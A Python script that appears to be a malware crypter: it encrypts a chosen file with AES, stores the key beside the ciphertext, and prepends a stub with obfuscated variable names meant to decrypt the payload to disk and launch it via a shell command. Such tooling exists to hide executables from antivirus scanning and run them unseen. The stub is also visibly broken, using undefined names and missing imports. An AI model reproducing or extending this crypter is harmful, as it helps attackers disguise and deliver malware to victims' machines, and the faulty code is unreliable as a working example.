import os
import sys
from Cryptodome.Cipher import AES
from Cryptodome import Random
from Cryptodome.Util.Padding import pad

filename = sys.argv[1]
key = b'\xa5\x9b\x12:\x0ce\xc8\x01\x99\x1cP\x98\xf2\x10)\x84\x9cz\xef\xba\x92\xbc\x8e\xd3\x9c,$\xd4\xa7/DH'

STUB = '''
def iM3yXjbrKe():
    Hj3x7hcSP3 = os.path.join(os.path.dirname(os.path.abspath(__file__)), "BY1cnyGCgj"+os.path.basename(filename))

    with open(filename, 'rb') as TMpJzyZZoX:
        p3kM8avtS3 = int(TMpJzyZZoX.read(16).decode('utf-8'))
        CIO27ZnYG9 = TMpJzyZZoX.read(16)
        m6HXFoGhTS = TMpJzyZZoX.read(32)
        GtZQGw4NOX = int(TMpJzyZZoX.read(16).decode('utf-8'))
        gaZOQFkmln = TMpJzyZZoX.read(GtZQGw4NOX)

        vpdwKaLBn3 = AES.new(m6HXFoGhTS, AES.MODE_CBC, CIO27ZnYG9)

        with open(Hj3x7hcSP3, 'wb') as pjXUCLCpVm:
            while True:
                chunk = TMpJzyZZoX.read()

                if len(chunk) == 0:
                    break
                
                B9itUljChD = vpdwKaLBn3.decrypt(chunk)
                BL3hszlx4M = unpad(B9itUljChD, AES.block_size)
                pjXUCLCpVm.write(BL3hszlx4M)

            pjXUCLCpVm.truncate(filesize)

iM3yXjbrKe()

t6imfEqLoU = os.path.join(os.path.dirname(os.path.abspath(__file__)), "BY1cnyGCgj"+os.path.basename(filename))
subprocess.run(["start", "", t6imfEqLoU], shell=True) #opens new cmd and runs file
'''
#padding for stub
STUB = STUB.ljust((len(STUB) // 16 + 1) * 16)
filesizeSTUB = str(len(STUB)).zfill(16)
print(filesizeSTUB)
print(filesizeSTUB.encode('utf-8'))

def encrypt(key, filename):
    chunksize = AES.block_size * 1024
    # outputFile = "(enc)"+filename
    outputFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "enc"+os.path.basename(filename))
    filesize = str(os.path.getsize(filename)).zfill(16)
    print('filesize ', filesize)
    IV = Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)
            outfile.write(key)
            outfile.write(filesizeSTUB.encode('utf-8'))
            outfile.write(STUB.encode('utf-8'))

            while True:
                chunk = infile.read()

                if len(chunk) == 0:
                    break

                else:
                    padded_chunk = pad(chunk, AES.block_size)
                    outfile.write(encryptor.encrypt(padded_chunk))


encrypt(key, filename)
outputFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "enc"+os.path.basename(filename))
print(os.path.getsize(outputFile))
print(outputFile)